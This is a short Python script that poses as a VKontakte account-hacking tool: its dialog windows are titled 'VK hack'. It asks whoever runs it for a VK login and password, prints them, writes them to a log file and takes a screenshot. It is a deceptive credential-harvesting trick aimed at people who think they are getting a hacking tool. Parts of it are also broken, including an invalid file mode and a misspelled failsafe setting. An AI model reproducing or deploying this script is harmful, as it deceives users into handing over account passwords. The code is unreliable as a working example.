import pyautogui as ag
from time import sleep
ag.failsafe = True
i = 0

while i in range(1):
	login = ag.prompt("Введите логин: ", "Взлом ВК")
	if login == 'Login' or login == 'login':
		ag.alert("Ошибка", "Взлом ВК")
	else:
		password = ag.password("Введите пароль: ", "Взлом ВК")
		if password == 'Password' or password == 'password':
			ag.alert("Ошибка", "Взлом ВК")
		else:
			print("Твой логин: " + login)
			print("Твой пароль: " + password)
			with open("log.txt", "wt-") as inFile:
				line = str("\nLogin: " + str(login) + "\npassword: " + str(password))
				inFile.write(line)
				inFile.close()
			sleep(2)
			ag.screenshot("yourPic.png")
			i += 1